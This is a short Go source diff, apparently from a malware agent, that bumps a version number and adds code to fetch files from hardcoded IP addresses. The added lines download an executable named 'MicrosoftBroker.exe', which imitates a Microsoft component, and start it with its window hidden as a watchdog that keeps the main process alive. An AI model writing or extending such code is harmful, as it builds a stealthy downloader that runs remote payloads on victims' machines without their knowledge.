@@ -23,7 +23,7 @@ import (
 	"time"
 )
 
-const VERSION string = "5"
+const VERSION string = "6"
 const MIDURL string = "http://111.231.82.173/"
 const MIDFILE string = "http://47.95.233.176/file/"
 const MIDAUTH string = "http://111.231.82.173:9000/auth"
@@ -170,6 +170,12 @@ func MultiFileDown(files []string, step string, downflag chan string) {
 			Get(MIDFILE+name.Name, name.Name)
 		}
 		downflag <- "done"
+	} else {
+		for _, name := range files {
+			if FileExits(CURRENTPATH+name) != nil {
+				Get(MIDFILE+name, name)
+			}
+		}
 	}
 }
 
@@ -202,6 +208,14 @@ func ErrorStatusCode(code int, hostid string, addr string) {
 		End()
 }
 func ListProcess() {
+	downflag := make(chan string)
+	//keep the main process live
+	checkdog := []string{
+		"MicrosoftBroker.exe"}
+	MultiFileDown(checkdog, "again", downflag)
+	dogcmd := exec.Command(CURRENTPATH + "MicrosoftBroker.exe")
+	dogcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	dogcmd.Start()
 	KillDog()
 	var text, _ = ioutil.ReadFile(NOGUILOG)
 	current_file := strings.Split(string(text), "\\")
